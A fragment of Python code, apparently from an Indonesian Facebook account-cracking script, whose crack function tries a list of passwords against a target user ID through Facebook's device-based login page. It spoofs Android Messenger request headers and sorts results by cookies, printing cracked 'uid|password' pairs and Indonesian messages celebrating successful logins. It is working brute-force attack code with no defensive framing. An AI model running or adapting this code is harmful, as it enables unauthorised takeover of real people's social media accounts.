...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get(f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&ref=wizard&_rdr')
			...
			heade={'Host': url_log,'cache-control': 'max-age=0','pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url_log}','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'com.facebook.orca','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','referer': f'https://{url_log}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&ref=wizard&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(f'{M2} ANDA BELUM BERUNTUNG HARI INI!!'))
					print(f'\r{K}🚀 {idf}|{pw}\n')
				...
				if 'no' in taplikasi:
					...
					cetak(nel(f'{H2}HOREE NYA TAP YESS!!SILAHKAN LOGIN DI FB LITE✓✓✓'))
